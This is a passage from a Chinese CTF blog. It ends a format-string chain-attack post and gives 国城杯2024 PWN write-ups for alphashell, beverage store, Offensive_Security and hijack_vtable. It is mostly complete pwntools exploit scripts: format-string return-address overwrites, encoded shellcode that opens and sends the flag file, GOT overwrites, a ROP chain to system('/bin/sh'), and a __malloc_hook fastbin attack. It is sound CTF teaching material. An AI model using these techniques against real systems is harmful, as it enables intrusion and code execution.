<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>接下来其实就简单了，既然栈上已经有一条二级链指向返回地址，我们只需要再用一次<code>%n</code>修改返回地址为backdoor就行了<img src="https://www.mmmick.cn/images/pasted-34.png" alt="图片描述"><br>
到这里的exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>最后输入<code>quit</code>即可getshell<br>
<img src="https://www.mmmick.cn/images/pasted-36.png" alt="图片描述"></p>
<h1>0x3 EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter &quot;quit&quot; to stop program!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>0x4 参考文章</h1>
<p>Ex师傅的printf 成链攻击: <a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">https://blog.eonew.cn/2019/08/27/printf-成链攻击/</a></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>国城杯2024 PWN WP</title>
    <url>/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-WP/</url>
    <content><![CDATA[<h1>国城杯2024 PWN WP</h1>
<h2 id="alphashell">alphashell</h2>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<h3 id="分析">分析</h3>
<p>要求输入字符为可见字符</p>
<p>sandbox禁用了open write writev read和execve等函数</p>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;125.70.243.22&#x27;,&#x27;31709&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov rbx,0x67616c662f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">mov rdi,r10</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov eax,SYS_openat</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">mov r10,0x100</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov eax,SYS_sendfile</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">payload = obj.encode(sc,<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="beverage-store">beverage store</h2>
<h3 id="分析-2">分析</h3>
<p>类型转换错误，导致可以反向越界修改之前的内容</p>
<p>对于这道题，可以先修改exit got，重启程序流程</p>
<p>接着修改printf got为system，最后把exit got重新改为后门函数地址即可</p>
<h3 id="EXP-2">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31668&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">clibc.srand(<span class="number">0x42424242</span>)</span><br><span class="line">num = clibc.rand()</span><br><span class="line">ru(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0x40133B</span>) + p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">libc_base = addr64() - <span class="number">0x46061</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">payload = p64(system)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Offensive-Security">Offensive_Security</h2>
<h3 id="分析-3">分析</h3>
<p><img src="/images/pasted-15.png" alt="upload successful"></p>
<p><img src="/images/pasted-16.png" alt="upload successful"></p>
<p><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>多线程但是未对资源加锁，输入任意同样的字符串即可绕过限制</p>
<p><img src="/images/pasted-18.png" alt="upload successful"></p>
<p>存在格式化字符串漏洞，可泄露密码和libc基址</p>
<p>最后栈溢出然后getshell</p>
<h3 id="EXP-3">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./attachment&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31652&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sla(<span class="string">&#x27;Username:&#x27;</span>,<span class="string">&#x27;%7$s%39$p&#x27;</span>)</span><br><span class="line">        ru(<span class="string">&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">        passwd = p.recv(<span class="number">8</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sl(passwd)</span><br><span class="line">        libc_leak = addr64()</span><br><span class="line">        lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line">        <span class="keyword">if</span> (libc_leak &amp; <span class="number">0xff</span>) == <span class="number">0x80</span>:</span><br><span class="line">            libc_base = libc_leak - <span class="number">0x21b780</span></span><br><span class="line">            lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            ogs = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>]</span><br><span class="line">            payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(<span class="number">0x0000000000400462</span>) + p64(<span class="number">0x0000000000400661</span>) + p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc_base+libc.sym.system)</span><br><span class="line">            sla(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>(<span class="string">&#x27;环境有毛病&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="hijack-vtable">hijack_vtable</h2>
<h3 id="分析-4">分析</h3>
<p>没啥好分析的，add、show、delete、edit都没限制，直接fastbin attack打malloc hook</p>
<h3 id="EXP-4">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31986&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,<span class="built_in">len</span>,con</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;length:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = addr64() - <span class="number">0x39bb78</span></span><br><span class="line">lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(libc_base + <span class="number">0xd5c07</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>国城杯</tag>
      </tags>
  </entry>
</search>
